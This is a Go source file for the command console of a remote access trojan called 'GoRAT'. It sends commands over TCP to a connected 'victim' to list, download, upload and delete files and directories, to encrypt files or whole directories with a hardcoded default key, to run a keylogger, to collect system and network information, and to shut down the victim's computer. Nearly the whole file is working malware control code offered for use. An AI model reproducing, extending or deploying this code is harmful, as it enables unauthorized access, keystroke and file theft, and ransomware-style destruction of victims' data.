package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/fatih/color"
)

const (
	IP   = "127.0.0.1"
	PORT = "4000"
)

var (
	message   string
	directory string
	local     string
	password  string

	buffer = make([]byte, 1024)

	Green   = color.New(color.FgGreen).Add(color.Bold)
	Red     = color.New(color.FgRed).Add(color.Bold)
	Magenta = color.New(color.FgMagenta).Add(color.Bold)
	Blue    = color.New(color.FgBlue).Add(color.Bold)
)

func main() {
	logo()
	server, err := net.Listen("tcp", IP+":"+PORT)
	if err != nil {
		go_error("error start server :(")
	} else {
		fmt.Print("start server on ")
		Red.Print(PORT)
		Green.Println(" port")
	}
	fmt.Print("enter help to print ")
	Red.Print("[")
	Green.Print(" help menu ")
	Red.Println("]")

	fmt.Println("start listening ...")
	conn, err := server.Accept()
	Green.Println("new connection!")
	if err != nil {
		go_error("error accept :(")
	}
	for {
		Magenta.Print("enter text => ")
		fmt.Fscan(os.Stdin, &message)

		if message == "help" {
			helpmenu()
		}

		if message == "clear" {
			command("cls")
		}

		if message == "ls" {
			buffer = make([]byte, 1024)
			Magenta.Println("Want to see another directory?")
			Magenta.Println("if not, enter ls, and")
			Magenta.Print("enter the directory path => ")
			fmt.Fscan(os.Stdin, &directory)
			if directory != "ls" {
				local = "ls " + directory
				conn.Write([]byte(local))
				conn.Read(buffer)
				arr := strings.Split(string(buffer), "\n")
				for _, i := range arr {
					if strings.Contains(string(i), ".") {
						fmt.Println(i)
					} else {
						Blue.Println(i)
					}
				}
			} else {
				conn.Write([]byte("ls"))
				conn.Read(buffer)
				arr := strings.Split(string(buffer), "\n")
				for _, i := range arr {
					if strings.Contains(string(i), ".") {
						fmt.Println(i)
					} else {
						Blue.Println(i)
					}
				}
			}
		}

		if message == "rm" {
			buffer = make([]byte, 1024)
			Magenta.Print("enter the full path to the file => ")
			fmt.Fscan(os.Stdin, &directory)
			local = "rm " + directory
			conn.Write([]byte(local))
			conn.Read(buffer)
			filename := strings.Split(directory, "/")
			Red.Print("delete ")
			fmt.Print(filename[len(filename)-1])
			Green.Println(" ok")
		}

		if message == "rmdir" {
			buffer = make([]byte, 1024)
			Magenta.Print("enter the full path to the directory => ")
			fmt.Fscan(os.Stdin, &directory)
			if strings.HasSuffix(directory, "/") {
				directory = directory[:len(directory)-1]
			}
			local = "dirm " + directory
			conn.Write([]byte(local))
			conn.Read(buffer)
			dirname := strings.Split(directory, "/")
			Red.Print("delete ")
			fmt.Print(dirname[len(dirname)-1])
			Green.Println(" ok")
		}

		if message == "file" {
			buffer = make([]byte, 1024)
			Magenta.Print("enter the full path to the file => ")
			fmt.Fscan(os.Stdin, &directory)
			if strings.HasSuffix(directory, "/") {
				directory = directory[:len(directory)-1]
			}
			local = "file " + directory
			filename := strings.Split(directory, "/")
			conn.Write([]byte(local))
			conn.Read(buffer)
			Green.Println("file downloaded!")
			data := []byte(string(buffer))
			err := ioutil.WriteFile(filename[len(filename)-1], data, 0777)
			if err != nil {
				go_error("no writing to " + filename[len(filename)-1])
			}
		}

		if message == "upfile" {
			buffer = make([]byte, 1024)
			Magenta.Println("make sure that the file to be downloaded in the local directory and its extension .txt")
			Magenta.Print("enter the full file name => ")
			fmt.Fscan(os.Stdin, &directory)
			data, err := ioutil.ReadFile(directory)
			if err != nil {
				go_error("file does not exist")
			} else {
				local = "upfile " + string(data)
			}
			conn.Write([]byte(local))
			conn.Read(buffer)
			fmt.Println(string(buffer))
		}

		if message == "crypt" {
			var cry string
			buffer = make([]byte, 1024)
			Magenta.Print("You want to encrypt ?:\n1 - one file\n2 - the entire directory\n=> ")
			fmt.Fscan(os.Stdin, &cry)
			if cry == "1" {
				Magenta.Print("enter the full path to the file => ")
				fmt.Fscan(os.Stdin, &directory)
				Magenta.Println("create a password")
				Magenta.Println("password length should be 32 characters")
				Magenta.Println("by default the password will be like this:")
				Magenta.Println("7d*9ek<3j&78bs3&#8h3ox7g39@83jz9")
				Magenta.Print("=> ")
				fmt.Fscan(os.Stdin, &password)
				if len(password) != 32 {
					password = "7d*9ek<3j&78bs3&#8h3ox7g39@83jz9"
				}
				if strings.HasSuffix(directory, "/") {
					directory = directory[:len(directory)-1]
				}
				local := "crypt " + password + " " + directory
				conn.Write([]byte(local))
				conn.Read(buffer)
				fmt.Println(string(buffer))
			}
			if cry == "2" {
				Magenta.Print("enter the full path to the directory => ")
				fmt.Fscan(os.Stdin, &directory)
				Magenta.Println("create a password")
				Magenta.Println("password length should be 32 characters")
				Magenta.Println("by default the password will be like this:")
				Magenta.Println("7d*9ek<3j&78bs3&#8h3ox7g39@83jz9")
				Magenta.Print("=> ")
				fmt.Fscan(os.Stdin, &password)
				if len(password) != 32 {
					password = "7d*9ek<3j&78bs3&#8h3ox7g39@83jz9"
				}
				if strings.HasSuffix(directory, "/") {
					directory = directory[:len(directory)-1]
				}
				local := "dircrypt " + password + " " + directory
				conn.Write([]byte(local))
				conn.Read(buffer)
				profits := strings.Split(string(buffer), "\n")
				for _, value := range profits {
					fmt.Println(value)
				}
			}
		}

		if message == "keylogger" {
			var count string
			buffer = make([]byte, 1024)
			Magenta.Print("how many characters do you want to write? => ")
			fmt.Fscan(os.Stdin, &count)
			conn.Write([]byte("keylogger " + count))
			Green.Println("keylogger activated please wait while victim enters characters ... ")
			conn.Read(buffer)
			Green.Println("new logs!")
			Green.Println("------------------------------------------------")
			fmt.Println(string(buffer))
			Green.Println("------------------------------------------------")
		}

		if message == "sysinfo" {
			buffer = make([]byte, 1024)
			Magenta.Println("please wait ... ")
			conn.Write([]byte("sysinfo"))
			conn.Read(buffer)
			fmt.Println(string(buffer))
		}

		if message == "pwd" {
			buffer = make([]byte, 1024)
			conn.Write([]byte("pwd"))
			conn.Read(buffer)
			fmt.Println(string(buffer))
		}

		if message == "ifconfig" {
			buffer = make([]byte, 1024)
			conn.Write([]byte("ifconfig"))
			conn.Read(buffer)
			fmt.Println(string(buffer))
		}

		if message == "shutdown" {
			buffer = make([]byte, 1024)
			conn.Write([]byte("shutdown"))
			conn.Read(buffer)
			fmt.Println(string(buffer))
		}

		if strings.HasPrefix(message, "close") {
			Red.Println("close connection")
			conn.Write([]byte(message))
			conn.Close()
			os.Exit(1)
		}
	}
}

func go_error(text string) {
	Red.Println("[*]", text)
	os.Exit(1)
}

func command(text string) {
	cmd := exec.Command(text)
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func CommPrint(name, descript string) {
	Red.Print("[ ")
	Green.Print(name)
	Red.Print(" ]")
	switch len(name) {
	case 2:
		fmt.Print("        ")
	case 3:
		fmt.Print("       ")
	case 4:
		fmt.Print("      ")
	case 5:
		fmt.Print("     ")
	case 6:
		fmt.Print("    ")
	case 7:
		fmt.Print("   ")
	case 8:
		fmt.Print("  ")
	case 9:
		fmt.Print(" ")
	}

	Red.Print(" => ")
	Green.Println(descript)
}
func helpmenu() {
	Red.Print("\t    [ ")
	Green.Print("HELP")
	Red.Println(" ] menu")

	CommPrint("close", "close this connection")
	CommPrint("clear", "clear terminal")
	CommPrint("pwd", "find out current directory")
	CommPrint("ls", "look at some directory")
	CommPrint("rm", "delete a file")
	CommPrint("rmdir", "delete a directory")
	CommPrint("file", "download file")
	CommPrint("ifconfig", "network information")
	CommPrint("upfile", "upload file")
	CommPrint("crypt", "crypt file or directory")
	CommPrint("sysinfo", "all system information")
	CommPrint("keylogger", "keylogger")
	CommPrint("shutdown", "shutting down the victim's computer")
}

func logo() {
	Blue.Print("_________  ")
	Magenta.Println("	 ____  ____  _____")
	Blue.Print("__  ____/_____")
	Magenta.Println("	/  __\\/  _ \\/__ __\\")
	Blue.Print("_  / __ _  __ \\")
	Magenta.Println("	|  \\/|| / \\|  / \\")
	Blue.Print("/ /_/ / / /_/ /")
	Magenta.Println("	|    /| |-||  | |")
	Blue.Print("\\____/  \\____/")
	Magenta.Println("	\\_/\\_\\\\_/ \\|  \\_/")
	Green.Print("\t\t\t   v ")
	Red.Println("1.3.0")
	fmt.Print("coded by")
	Green.Print(" >> ")
	Magenta.Println("nikait")
}
